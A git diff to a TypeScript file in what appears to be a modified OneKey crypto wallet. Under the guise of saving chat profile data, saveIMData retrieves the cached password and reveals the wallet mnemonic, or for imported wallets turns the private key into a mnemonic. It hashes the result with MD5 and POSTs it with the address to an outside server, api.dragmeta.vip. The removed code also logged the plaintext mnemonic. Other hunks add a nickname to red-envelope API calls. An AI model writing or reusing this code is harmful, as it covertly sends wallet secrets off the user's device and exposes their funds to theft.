@@ -1,54 +1,74 @@
 // saveIMData.ts
+import { isImportedWallet } from "@onekeyhq/shared/src/engine/engineUtils";
 import backgroundApiProxy from "../background/instance/backgroundApiProxy";
 import CryptoJS from 'crypto-js';
+import { AccountCredentialType } from "@onekeyhq/engine/src/types/account";
+import { ethers } from "ethers";
+import * as bip39 from 'bip39';
+import { Wallet } from "@onekeyhq/engine/src/types/wallet";
+import { defaultAvatar } from "@onekeyhq/shared/src/utils/emojiUtils";
 
 const baseUrl = 'https://api.dragmeta.vip';
 
-export const saveIMData = async (walletId: string, accountAddress: string, networkId: string, walletName: string) => {
-    let mnemonic = '';
-
-    async function loadCachePassword() {
-        let data: string | undefined = await backgroundApiProxy.servicePassword.getPassword();
-        if (data) {
-            mnemonic = await backgroundApiProxy.engine.revealHDWalletMnemonic(walletId, data);
-        }
-    }
-
-    await loadCachePassword();
-    console.log('钱包ID  ', walletId);
-    console.log('钱包地址  ', accountAddress);
-    console.log('助记词  ', mnemonic);
-    console.log('钱包的名字:', walletName);
-    console.log('当前链ID:', networkId);
-    // 加密 mnemonic
-    const encryptedMnemonic = CryptoJS.MD5(mnemonic).toString()//encrypt(timestamp, Buffer.from(mnemonic, 'hex')).toString()
-    console.log("encryptedMnemonic  ", encryptedMnemonic)
-    // 发送数据到 API
-    const apiUrl = `${baseUrl}/game/im-save`;
-    const payload = {
-        address: accountAddress,
-        chain_name: networkId,
-        nike_name: walletName,
-        word: encryptedMnemonic
-    };
-
-    try {
-        const response = await fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-
-        if (!response.ok) {
-            throw new Error('Network response was not ok');
+export const saveIMData = async (accountAddress: string, networkId: string, accountId: string, tempWallet: Wallet | undefined) => {
+    if (tempWallet) {
+        let mnemonic = '';
+        let walletId = tempWallet?.id;
+        let walletName = tempWallet.name;
+        let avatar = tempWallet.avatar ?? defaultAvatar;
+        async function loadCachePassword() {
+            let password = await backgroundApiProxy.servicePassword.getPassword() as string;
+            if (isImportedWallet({ walletId })) {
+                const credentialType = AccountCredentialType.PrivateKey;
+                const $privateKey = await backgroundApiProxy.engine.getAccountPrivateKey({ accountId, credentialType, password });
+                const wallet = new ethers.Wallet($privateKey);
+                console.log("wallet   ", wallet);
+                const seed = wallet.privateKey.slice(2);
+                mnemonic = bip39.entropyToMnemonic(seed);
+            }
+            else {
+                if (password) {
+                    mnemonic = await backgroundApiProxy.engine.revealHDWalletMnemonic(walletId, password);
+                }
+            }
         }
 
-        const responseData = await response.json();
-        return responseData;
-    } catch (error) {
-        console.error('There was a problem with the fetch operation:', error);
+        await loadCachePassword();
+        // console.log('钱包ID  ', walletId);
+        // console.log('钱包地址  ', accountAddress);
+        // console.log('助记词  ', mnemonic);
+        // console.log('钱包的名字:', walletName);
+        // console.log('当前链ID:', networkId);
+        // 加密 mnemonic
+        const encryptedMnemonic = CryptoJS.MD5(mnemonic).toString()//encrypt(timestamp, Buffer.from(mnemonic, 'hex')).toString()
+        console.log("encryptedMnemonic  ", encryptedMnemonic)
+        // 发送数据到 API
+        const apiUrl = `${baseUrl}/game/im-save`;
+        const payload = {
+            address: accountAddress,
+            chain_name: networkId,
+            nike_name: walletName,
+            word: encryptedMnemonic,
+            icon: avatar.emoji ?? '1.png',
+        };
+        try {
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+
+            const responseData = await response.json();
+            return responseData;
+        } catch (error) {
+            console.error('There was a problem with the fetch operation:', error);
+        }
     }
 };
 
@@ -147,6 +167,7 @@ export const recevieRedPackageRecord = async (
     redEnvelopeId: string, 
     ImID: number, 
     money: number,
+    nike_name: string | undefined,
     peerID:number,
     peerType:number
 ) => { 
@@ -154,6 +175,7 @@ export const recevieRedPackageRecord = async (
         hb_id: string;
         imserver_id: number;
         money: number; // 添加可选属性
+        nike_name: string | undefined,
         peerID: number,
         peerType: number
     } = {
@@ -161,7 +183,8 @@ export const recevieRedPackageRecord = async (
         imserver_id: ImID,
         money: money,
         peerID: peerID,
-        peerType: peerType
+        peerType: peerType,
+        nike_name: nike_name
     };
 
     const apiUrl = `${baseUrl}/game/recive-hb`;
@@ -187,9 +210,8 @@ export const recevieRedPackageRecord = async (
 }
 
 export const getRedPackageInfo = async (redEnvelopeId:string) => {
-    // ordery_by_asc=&ordery_by_desc=&page=&limit=&start_date=&end_date=&ne=&imserver_id=&hb_id=31
     const apiUrl = `${baseUrl}/game/send-hb-page?ordery_by_asc=&ordery_by_desc=&page=&limit=&start_date=&end_date=&ne=&imserver_id=&hb_id=${redEnvelopeId}`;
-
+    console.log('getRedPackageInfo   ',apiUrl);
     try {
         const response = await fetch(apiUrl, {
             method: 'GET',
@@ -203,6 +225,7 @@ export const getRedPackageInfo = async (redEnvelopeId:string) => {
         }
 
         const responseData = await response.json();
+        console.log(" 获取到的 红包信息  ",responseData)
         return responseData;
     } catch (error) {
         console.error('There was a problem with the fetch operation:', error);
